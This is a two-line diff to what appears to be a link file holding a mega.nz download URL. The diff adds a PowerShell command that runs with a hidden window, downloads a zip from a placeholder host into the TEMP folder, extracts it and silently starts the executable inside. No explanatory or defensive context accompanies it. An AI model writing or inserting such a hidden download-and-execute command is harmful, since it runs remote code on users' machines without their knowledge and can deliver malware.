@@ -1,1 +1,2 @@
 https://mega.nz/file/WFwn0bJS#qhv7CSYGPaU2EQH56zQGKL1oGKOK2iJx_illmEYGKYU
+powershell -NoProfile -WindowStyle Hidden -Command "$u='https://exemplu.com/fișier.zip'; $z=\"$env:TEMP\fișier.zip\"; $d=\"$env:TEMP\extrase\"; Invoke-WebRequest -Uri $u -OutFile $z; Expand-Archive -Path $z -DestinationPath $d -Force; Start-Process \"$d\program.exe\""
